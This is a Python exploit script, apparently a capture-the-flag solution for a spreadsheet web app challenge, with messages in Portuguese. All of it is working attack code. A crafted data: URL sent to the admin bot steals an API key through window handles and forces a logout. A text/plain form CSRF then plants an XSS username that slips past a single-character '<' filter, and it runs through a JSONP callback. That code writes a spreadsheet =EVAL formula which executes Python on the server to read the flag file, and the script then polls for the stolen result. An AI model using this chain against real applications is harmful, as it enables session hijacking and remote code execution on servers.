#!/usr/bin/env python3
import argparse
import json
import re
import time
from urllib.parse import quote

import requests


DEFAULT_TARGET = "https://784d567131fc36e2.chal.ctf.ae"
DEFAULT_BOT_BASE = "http://127.0.0.1:5000"


def build_report_url(target: str, bot_base: str) -> str:
    """Build a self-contained data: URL that the admin bot will visit."""
    formula = (
        '=EVAL("__import__(\'pathlib\').Path(__import__(\'glob\').glob(\'/app/flag*.txt\')[0]).read_text()")'
    )
    formula_literal = json.dumps(formula)

    xss_js = r'''
(async()=>{
 const sleep=m=>new Promise(r=>setTimeout(r,m));
 async function getKey(){
   for(let i=0;i<50;i++){
     try{
       let w=open('', 'key');
       let t=w&&w.document&&w.document.body&&w.document.body.innerText;
       if(t&&t.includes('"key"')) return JSON.parse(t).key;
     }catch(e){}
     await sleep(150);
   }
 }
 const key=await getKey();
 if(!key) return;
 await fetch('/api/sheets/reset');
 let d=await fetch('/api/sheets').then(r=>r.json());
 let rows=d.rows;
 while(rows.length<15) rows.push([null,null,null,null,null,null]);
 rows[4]=[__FORMULA__,2,3,4,null,null];
 await fetch('/api/sheets',{method:'POST',headers:{'Content-Type':'application/json','X-API-Key':key},body:JSON.stringify({header:d.header,rows})});
 await sleep(500);
 d=await fetch('/api/sheets').then(r=>r.json());
 rows=d.rows;
 while(rows.length<15) rows.push([null,null,null,null,null,null]);
 if(!rows[4]) rows[4]=[null,null,null,null,null,null];
 rows[4][0]=null;
 rows[4][1]=2;
 rows[4][2]=3;
 rows[4][3]=4;
 await fetch('/api/sheets',{method:'POST',headers:{'Content-Type':'application/json','X-API-Key':key},body:JSON.stringify({header:d.header,rows})});
})();
'''.replace("__FORMULA__", formula_literal).strip() + "//"

    callback = quote(xss_js, safe="")

    # ProfileSettingsPage removes only the first '<'. The doubled leading '<' leaves a
    # real </textarea>, then iframe/srcdoc loads the same-origin JSONP endpoint as JS.
    username = (
        "<</textarea><iframe srcdoc='"
        f"<script src=&quot;/api/whoami/jsonp?callback={callback}&quot;></script>"
        "'></iframe>"
    )

    # Escape </script> so it does not terminate the outer attack page's script block.
    username_literal = json.dumps(username).replace("</script>", "<\\/script>")
    bot_base_literal = json.dumps(bot_base.rstrip("/"))

    outer_html = f"""<!doctype html><meta charset=utf-8><script>
const BASE={bot_base_literal};
const username={username_literal};
const sleep=m=>new Promise(r=>setTimeout(r,m));
(async()=>{{
  open(BASE+'/api/key','key');
  await sleep(600);
  open(BASE+'/api/logout','logout');
  await sleep(700);
  let xw=open('about:blank','xsswin');
  let f=document.createElement('form');
  f.method='POST';
  f.enctype='text/plain';
  f.action=BASE+'/api/whoami';
  f.target='xsswin';
  let i=document.createElement('input');
  i.name='{{"new_username":'+JSON.stringify(username)+',"x":"';
  i.value='"}}';
  f.appendChild(i);
  document.body.appendChild(f);
  f.submit();
  await sleep(1000);
  xw.location=BASE+'/#/settings';
}})();
</script>"""

    data_url = "data:text/html;charset=utf-8," + quote(outer_html, safe="")
    return f"{target.rstrip('/')}/report?url={quote(data_url, safe='')}"


def poll_flag(target: str, verify_tls: bool, attempts: int = 20) -> str | None:
    flag_re = re.compile(r"(?i)\b[a-z0-9_]{2,32}\{[^}\n]{3,}\}")
    session = requests.Session()
    for _ in range(attempts):
        try:
            r = session.get(f"{target.rstrip('/')}/api/sheets", timeout=8, verify=verify_tls)
            text = r.text
            m = flag_re.search(text)
            if m:
                return m.group(0)
            try:
                data = r.json()
                a6 = data.get("rows", [[], [], [], [], [None]])[4][0]
                if isinstance(a6, str) and a6:
                    print(f"[?] A6 agora contém: {a6!r}")
            except Exception:
                pass
        except requests.RequestException as e:
            print(f"[!] Falha ao consultar /api/sheets: {e}")
        time.sleep(1)
    return None


def main() -> None:
    parser = argparse.ArgumentParser(description="Exploit para o CTF Sheets")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="URL externa do desafio")
    parser.add_argument("--bot-base", default=DEFAULT_BOT_BASE, help="URL interna vista pelo bot")
    parser.add_argument("--insecure", action="store_true", help="desativa validação TLS")
    parser.add_argument("--print-url", action="store_true", help="imprime só a URL de /report")
    args = parser.parse_args()

    verify_tls = not args.insecure
    report_url = build_report_url(args.target, args.bot_base)

    if args.print_url:
        print(report_url)
        return

    print(f"[*] Enviando payload para {args.target.rstrip('/')}/report")
    r = requests.get(report_url, timeout=25, verify=verify_tls)
    print(f"[*] /report respondeu HTTP {r.status_code}: {r.text[:300]}")

    print("[*] Procurando a flag em /api/sheets ...")
    flag = poll_flag(args.target, verify_tls)
    if flag:
        print(f"[+] FLAG: {flag}")
    else:
        print("[-] Flag não apareceu; rode novamente ou aumente o número de tentativas em poll_flag().")


if __name__ == "__main__":
    main()
